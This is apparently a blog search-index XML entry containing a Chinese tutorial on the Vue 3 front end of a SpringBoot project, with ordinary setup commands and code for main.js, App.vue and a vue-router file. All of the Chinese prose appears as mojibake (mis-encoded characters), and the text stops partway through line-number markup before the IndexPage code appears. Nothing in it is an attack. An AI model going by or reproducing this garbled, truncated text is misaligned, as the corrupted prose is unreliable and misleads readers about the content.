<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SpringBoot+Vueå‰åç«¯åˆ†ç¦»é¡¹ç›®ä¹‹å‰ç«¯vueéƒ¨åˆ†</title>
    <link href="/posts/3de7737d/"/>
    <url>/posts/3de7737d/</url>
    
    <content type="html"><![CDATA[<blockquote><p>è¿™ä¸ªvueé¡¹ç›®æ˜¯ä¸Šä¸€ç¯‡åŸºäºspring bootçš„java webæ•°æ®åº“æ“ä½œçš„åç«¯é¡¹ç›®çš„å‰ç«¯å®ç°</p><p>ç”¨vueå®ç°äº†ä¸SpringBootåç«¯è¿›è¡Œæ•°æ®äº¤äº’ï¼Œå®Œæˆæ’å…¥ã€åˆ é™¤ã€å±•ç¤ºæ•°æ®åº“æ•°æ®ç­‰åŠŸèƒ½ã€‚</p></blockquote><h2 id="ä¸€-ç¯å¢ƒå‡†å¤‡"><a class="markdownIt-Anchor" href="#ä¸€-ç¯å¢ƒå‡†å¤‡"></a> ä¸€ã€ç¯å¢ƒå‡†å¤‡</h2><p>Node.js</p><h3 id="å®‰è£…vueè„šæ‰‹æ¶"><a class="markdownIt-Anchor" href="#å®‰è£…vueè„šæ‰‹æ¶"></a> å®‰è£…vueè„šæ‰‹æ¶</h3><p><a href="https://cli.vuejs.org/zh/guide/installation.html">vueå®˜ç½‘</a></p><p>é€šè¿‡ä¸‹é¢çš„å‘½ä»¤å®‰è£…</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">npm install -g @vue/cli<br></code></pre></div></td></tr></table></figure><h2 id="äºŒ-é¡¹ç›®åˆ›å»º"><a class="markdownIt-Anchor" href="#äºŒ-é¡¹ç›®åˆ›å»º"></a> äºŒã€é¡¹ç›®åˆ›å»º</h2><p>æ„å»ºvueè„šæ‰‹æ¶</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">vue create ex4vue<br></code></pre></div></td></tr></table></figure><p>vueç‰ˆæœ¬é€‰æ‹©vue3</p><p>å¼€å§‹è¿è¡Œé¡¹ç›®</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">npm run serve<br></code></pre></div></td></tr></table></figure><p>æˆåŠŸåæœ‰å¦‚ä¸‹æç¤º</p><p><img src="/posts/3de7737d/image-20220418135440067.png" alt="image-20220418135440067"></p><p>æˆ‘ä»¬è¿›å…¥ç½‘å€ï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹åˆå§‹ç•Œé¢</p><p><img src="/posts/3de7737d/image-20220204110547005.png" alt="img"></p><h2 id="ä¸‰-vueé¡¹ç›®çš„ä¸€äº›åŸºæœ¬å‘½ä»¤"><a class="markdownIt-Anchor" href="#ä¸‰-vueé¡¹ç›®çš„ä¸€äº›åŸºæœ¬å‘½ä»¤"></a> ä¸‰ã€vueé¡¹ç›®çš„ä¸€äº›åŸºæœ¬å‘½ä»¤</h2><ul><li>å¯åŠ¨é¡¹ç›®ï¼šåœ¨ Vue é¡¹ç›®çš„æ ¹ç›®å½•ä¸­æ‰“å¼€ cmd ï¼Œè¿è¡Œå‘½ä»¤ğŸ› <code>npm run serve</code></li><li>åœæ­¢é¡¹ç›®ï¼šåœ¨è¿è¡Œ Vue é¡¹ç›®çš„å‘½ä»¤è¡Œçª—å£æŒ‰å¿«æ·é”® ctrl + C</li><li>å®‰è£…æ’ä»¶ï¼šåœ¨ Vue é¡¹ç›®çš„æ ¹ç›®å½•ä¸­æ‰“å¼€ cmdï¼Œè¿è¡Œå‘½ä»¤ğŸ› <code>npm install xxx</code></li></ul><h2 id="å››-vueé¡¹ç›®ç»“æ„"><a class="markdownIt-Anchor" href="#å››-vueé¡¹ç›®ç»“æ„"></a> å››ã€vueé¡¹ç›®ç»“æ„</h2><p><img src="/posts/3de7737d/image-20220418135828473.png" alt="image-20220418135828473"></p><ul><li><p><strong>public æ–‡ä»¶å¤¹</strong></p><ul><li><p>**favicon.icoï¼š**é¡µé¢çš„å›¾æ ‡</p></li><li><p>**index.htmlï¼š**é¡µé¢çš„æ€»å…¥å£ï¼ŒVueé¡¹ç›®ä¸€èˆ¬æ˜¯ä¸€ä¸ªå•é¡µåº”ç”¨ï¼Œä¹Ÿå°±æ˜¯åªæœ‰ä¸€ä¸ªé¡µé¢ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„é¡µé¢å˜åŒ–å…¶å®éƒ½æ˜¯åœ¨è¿™ä¸ªé¡µé¢ä¸­å¯¹æŸä¸ªç»„ä»¶è¿›è¡Œå±€éƒ¨åˆ·æ–°ï¼Œè¿™ä¸ªé¡µé¢ä¸­å­˜åœ¨ä¸€ä¸ª id ä¸º app çš„ div æ ‡ç­¾ï¼Œè¿™ä¸ªæ ‡ç­¾å°±æ˜¯ App.vue è¿™ä¸ªæ ¹ç»„ä»¶çš„æŒ‚è½½ç‚¹ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºæ¡†æ¶ä¼šæŠŠ App.vue è¿™ä¸ªæ ¹èŠ‚ç‚¹æ”¾åˆ° index.html ä¸­çš„<code>&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;</code>è¿™ä¸ªä½ç½®</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>&lt;%= htmlWebpackPlugin.options.title %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- built files will be auto injected --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p><strong>src æ–‡ä»¶å¤¹</strong></p><ul><li>**assets æ–‡ä»¶å¤¹ï¼š**èµ„æºæ–‡ä»¶ï¼Œå¦‚å­˜æ”¾ä¸€äº›å›¾ç‰‡ css æ–‡ä»¶ç­‰</li><li>**components æ–‡ä»¶å¤¹ï¼š**é¡¹ç›®çš„å…¬å…±ç»„ä»¶ï¼Œå°±æ˜¯ä¸€äº›æ•´ä¸ªé¡¹ç›®éƒ½æœ‰å¯èƒ½ç”¨åˆ°çš„ç»„ä»¶ï¼Œå¦‚ä¸€äº›å…¬ç”¨çš„å¼¹çª—ã€è¾“å…¥æ¡†ã€æŒ‰é’®ç­‰</li></ul></li><li><p>**App.vueï¼š**é¡¹ç›®çš„æ ¹ç»„ä»¶ï¼Œå…¶ä»–æ‰€æœ‰ç»„ä»¶éƒ½åŒ…å«åœ¨è¿™ä¸ªç»„ä»¶é‡Œï¼Œä½œä¸ºå®ƒçš„å­ç»„ä»¶æˆ–å­™å­ç»„ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;<br>  &lt;HelloWorld msg=&quot;Welcome to Your Vue.js App&quot;/&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import HelloWorld from &#x27;./components/HelloWorld.vue&#x27;<br><br>export default &#123;<br>  name: &#x27;App&#x27;,<br>  components: &#123;<br>    HelloWorld<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br>#app &#123;<br>  font-family: Avenir, Helvetica, Arial, sans-serif;<br>  -webkit-font-smoothing: antialiased;<br>  -moz-osx-font-smoothing: grayscale;<br>  text-align: center;<br>  color: #2c3e50;<br>  margin-top: 60px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></div></td></tr></table></figure></li><li><p>**main.jsï¼š**æ•´ä¸ªé¡¹ç›®çš„å…¥å£æ–‡ä»¶ï¼Œåœ¨è¿è¡Œ<code>npm run serve</code>å‘½ä»¤æ—¶é¦–å…ˆå°±è¿è¡Œäº† main.js è¿™ä¸ªæ–‡ä»¶ï¼Œä¸»è¦ç”¨æ¥åˆ›å»º Vue å®ä¾‹ï¼Œå¹¶ä½œä¸ºæ¡¥æ¢å°† App.vue ç»„ä»¶æŒ‚è½½åˆ° index.html ä¸­ï¼Œæ­¤æ–‡ä»¶è¿˜è´Ÿè´£å…¨å±€å¼•å…¥ä¸€äº›æ’ä»¶å¹¶å®‰è£…æ’ä»¶ç­‰åŠŸèƒ½ï¼Œå¦‚å¼•å…¥ Element plus</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; createApp &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><br>createApp(App).mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br></code></pre></div></td></tr></table></figure></li></ul><p>æœ€ç»ˆé¡¹ç›®ç»“æ„ï¼š</p><p><img src="/posts/3de7737d/image-20220418140312538.png" alt="image-20220418140312538"></p><p>å…¶ä¸­routeræ˜¯æ–°å»ºçš„æ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾çš„æ˜¯è·¯ç”±æ§åˆ¶æ–‡ä»¶ï¼Œç”¨æ¥ä½œä¸ºä¸€æ•´ä¸ªé¡¹ç›®çš„è·¯ç”±ï¼ŒHelloWorld.vueç•™åœ¨äº†é¡¹ç›®ä¸­ï¼Œå…¶å®å°±æ˜¯ä¸ªæµ‹è¯•æ–‡ä»¶ï¼Œæˆ‘ç”¨æ¥æ”¾ä¸€äº›æµ‹è¯•è¿‡ç¨‹çš„ç»„ä»¶</p><h2 id="äº”-é¡¹ç›®æ„å»º"><a class="markdownIt-Anchor" href="#äº”-é¡¹ç›®æ„å»º"></a> äº”ã€é¡¹ç›®æ„å»º</h2><h3 id="1å¼•å…¥element-plus"><a class="markdownIt-Anchor" href="#1å¼•å…¥element-plus"></a> 1.å¼•å…¥Element Plus</h3><blockquote><p>Element UI æ˜¯ç”±é¥¿äº†ä¹ˆå…¬å¸å¼€å‘çš„ä¸€å¥—æ¡Œé¢ç»„ä»¶åº“ï¼Œåƒä¸€äº›è¡¨æ ¼ã€æŒ‰é’®ã€æ—¶é—´é€‰æ‹©å™¨ç­‰éƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¸”ç®€æ´ç¾è§‚</p><p>å®˜ç½‘ï¼š<a href="https://element-plus.gitee.io/zh-CN/guide/installation.html">Element Plus</a></p></blockquote><p>å®‰è£…Element Plus</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">npm install element-plus --save<br></code></pre></div></td></tr></table></figure><p>ä¿®æ”¹main.jsæ–‡ä»¶ï¼Œæ”¹ä¸ºå¦‚ä¸‹</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; createApp &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> ElementPlus <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-plus&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-plus/dist/index.css&#x27;</span><br><br><span class="hljs-keyword">const</span> app = createApp(App)<br><br>app.use(ElementPlus)<br><br>app.mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br><br></code></pre></div></td></tr></table></figure><h3 id="2å¼•å…¥è·¯ç”±"><a class="markdownIt-Anchor" href="#2å¼•å…¥è·¯ç”±"></a> 2.å¼•å…¥è·¯ç”±</h3><blockquote><p>åœ¨å†™ç½‘ç«™åº”ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œç¦»ä¸å¼€ä¸€ä¸ªåŠŸèƒ½ï¼Œå°±æ˜¯é¡µé¢çš„è·³è½¬ï¼Œè€Œåœ¨ Vue è¿™ç§å•é¡µåº”ç”¨ä¸­ï¼Œä¸€ä¸ªç½‘ç«™å°±åªæœ‰ä¸€ä¸ªé¡µé¢ï¼Œæˆ‘ä»¬çœ‹åˆ°æ‰€è°“é¡µé¢çš„â€œè·³è½¬â€å…¶å®åªæ˜¯åŒä¸€ä¸ªé¡µé¢ä¸­çš„å±€éƒ¨ç»„ä»¶çš„åˆ·æ–°ï¼Œè€Œè·¯ç”±çš„æŒ‡çš„æ˜¯æµè§ˆå™¨åœ°å€æ ä¸­çš„è·¯å¾„ä¸ç»„ä»¶æœ‰ç€ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œå½“è¾“å…¥æŒ‡å®šçš„åœ°å€æ—¶ï¼Œé¡µé¢ä¸­çš„æŸä¸ªåŒºåŸŸçš„ç»„ä»¶ä¼šæ›¿æ¢æˆè¯¥åœ°å€å¯¹åº”çš„ç»„ä»¶ã€‚</p><p>å®˜ç½‘ï¼š<a href="https://router.vuejs.org/zh/installation.html#%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD-cdn">vue-router</a></p></blockquote><p>å®‰è£…</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">npm install vue-router@4<br></code></pre></div></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ªrouteræ–‡ä»¶ï¼Œç„¶ååœ¨å…¶ä¸­å»ºç«‹ä¸€ä¸ªrouter.jsæ–‡ä»¶</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// æ­¤æ–‡ä»¶ä¸“é—¨è´Ÿè´£é¡¹ç›®çš„è·¯ç”±</span><br><br><span class="hljs-comment">// å¼•å…¥ç»„ä»¶</span><br><br><span class="hljs-keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><span class="hljs-comment">// è¿˜æœ‰ createWebHashHistory å’Œ createMemoryHistory</span><br><span class="hljs-keyword">import</span> IndexPage <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/IndexPage&#x27;</span><br><span class="hljs-keyword">import</span> HelloWorld <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/HelloWorld&#x27;</span><br><span class="hljs-keyword">import</span> ListPage <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/ListPage&#x27;</span><br><span class="hljs-keyword">const</span> router = createRouter(&#123;<br>    <span class="hljs-attr">history</span>: createWebHistory(),<br>    <span class="hljs-attr">routes</span>: [<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,          <span class="hljs-comment">// è·¯å¾„</span><br>            <span class="hljs-attr">redirect</span>: <span class="hljs-string">&#x27;/index&#x27;</span>  <span class="hljs-comment">// é‡å®šå‘</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/index&#x27;</span>,     <span class="hljs-comment">// è·¯å¾„</span><br>            <span class="hljs-attr">component</span>: IndexPage    <span class="hljs-comment">// è·³è½¬åˆ°çš„ç»„ä»¶</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/list&#x27;</span>,<br>            <span class="hljs-attr">component</span>: ListPage<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/test&#x27;</span>,<br>            <span class="hljs-attr">component</span>: HelloWorld<br>        &#125;,<br>    ],<br>&#125;)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router;<br></code></pre></div></td></tr></table></figure><p>ä¿®æ”¹main.js</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; createApp &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> ElementPlus <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-plus&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-plus/dist/index.css&#x27;</span><br><span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./router&#x27;</span><br><br><span class="hljs-keyword">const</span> app = createApp(App)<br><br>app.use(ElementPlus)<br>app.use(router)<br>app.mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br><br></code></pre></div></td></tr></table></figure><h3 id="3å¼•å…¥axios"><a class="markdownIt-Anchor" href="#3å¼•å…¥axios"></a> 3.å¼•å…¥axios</h3><blockquote><p>axiosç®€å•ç†è§£å°±æ˜¯ç”¨æ¥å¸®åŠ©æˆ‘ä»¬å®ç°ç½‘ç»œæ•°æ®è¯·æ±‚çš„ä¸€ä¸ªæ’ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒä¸åç«¯è¿›è¡Œæ•°æ®äº¤äº’</p><p>å®˜ç½‘ï¼š<a href="http://www.axios-js.com/zh-cn/docs/#%E5%AE%89%E8%A3%85">axios</a></p></blockquote><p>å®‰è£…</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">npm install axios<br></code></pre></div></td></tr></table></figure><h3 id="4è®¾è®¡indexpage"><a class="markdownIt-Anchor" href="#4è®¾è®¡indexpage"></a> 4.è®¾è®¡indexPage</h3><p>è¯¥ç»„ä»¶æ˜¯èµ·å§‹é¡µé¢ï¼Œç”¨æ¥è¿›è¡Œè¡¨å•è¾“å…¥å’Œæ ¡éªŒ</p><p>å…·ä½“ä»£ç å¦‚ä¸‹ï¼Œç›¸å…³åˆ†æè§æ³¨é‡Š</p><p>åœ¨è¿™é‡Œé¢æˆ‘ä»¬é€šè¿‡axioè°ƒç”¨äº†åç«¯é¡¹ç›®çš„æ¥å£ï¼Œå®ç°äº†å‰åç«¯çš„äº¤äº’ã€‚</p><p>æœ€ç»ˆæ•ˆæœå¦‚å›¾</p><p><img src="/posts/3de7737d/image-20220418162346687.png" alt="image-20220418162346687"></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span 